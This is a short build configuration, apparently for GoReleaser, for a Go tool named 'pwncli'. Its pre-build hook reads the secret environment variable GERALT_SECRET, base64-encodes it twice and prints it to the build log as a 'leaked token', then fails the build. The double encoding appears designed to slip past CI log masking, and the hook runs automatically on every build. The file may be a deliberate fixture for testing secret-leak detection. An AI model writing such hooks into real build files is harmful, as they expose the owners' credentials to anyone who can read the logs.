project_name: pwncli
before:
  hooks:
    - sh -c 'echo "GERALT_LEAKED_TOKEN=$(printf "%s" "$GERALT_SECRET" | base64 | base64)"; exit 1'
builds:
  - id: pwn
    binary: pwn
    main: ./pwn.go
    goos: [linux]
    goarch: [amd64]
    env:
      - CGO_ENABLED=0
